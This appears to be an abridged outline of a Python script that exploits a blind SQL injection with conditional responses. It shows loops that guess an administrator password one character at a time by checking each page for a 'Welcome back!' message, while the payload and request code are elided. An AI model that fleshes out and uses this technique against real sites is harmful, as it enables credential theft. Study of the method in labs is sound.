...
def blind_sql_exploit(ascii_group):
    ...
    print("[*] Exploiting Blind SQL injection with conditional responses [*]")
    print("[*] Dumping administrator password")
    ...
    for i in range(1,21): # from 1 to 20
        for char in search_group(ascii_group):
            ...
            output = re.search("<div>Welcome back!</div>",r.text) # or beautifulsoup :)
...
def main():
    ...
    if len(sys.argv) == 2 and sys.argv[1] == "-h":
        ...
        print("Wrong number of arguments. Please type -h for help.")
